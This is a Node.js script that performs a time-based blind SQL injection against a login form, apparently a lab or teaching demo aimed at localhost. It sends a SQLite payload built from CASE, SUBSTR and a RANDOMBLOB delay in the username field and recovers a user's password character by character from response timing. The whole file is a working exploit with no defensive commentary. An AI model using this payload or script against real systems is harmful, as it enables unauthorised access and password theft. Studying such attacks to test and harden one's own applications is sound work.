const got = require('got')
//import got from 'got'
//const got = await import('got')
const CHAR_START = 32 // space
const CHAR_END = 126 // tilde
const URL = 'http://localhost:8000/login'
const USERNAME = process.argv[2] || 'alice'
const TIME_THRESHOLD = 50
let password = ''
init()
async function init () {
  process.stdout.write('Trying')
  let char = CHAR_START
  while (char <= CHAR_END) {
    const position = password.length + 1
    const query = `${USERNAME}" AND CASE SUBSTR(password,${position},1) WHEN CHAR(${char}) THEN 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2)))) ELSE null END --`
    const time = await getResultWithTime(() => {
      return got(URL, {
        form: true,
        body: {
          username: query,
          password: ''
        }
}) })
    process.stdout.write(String.fromCharCode(char))
    if (time > TIME_THRESHOLD) {
      password += String.fromCharCode(char)
      console.log(' MATCH!')
      console.log(`  Password: ${password}`)
      char = CHAR_START
      process.stdout.write('Trying')
    } else {
      char += 1
} }
  console.log(`\n\nDONE. Password: ${password}`)
}
async function getResultWithTime (createPromise) {
  const startTime = Date.now()
  await createPromise()
  return Date.now() - startTime
}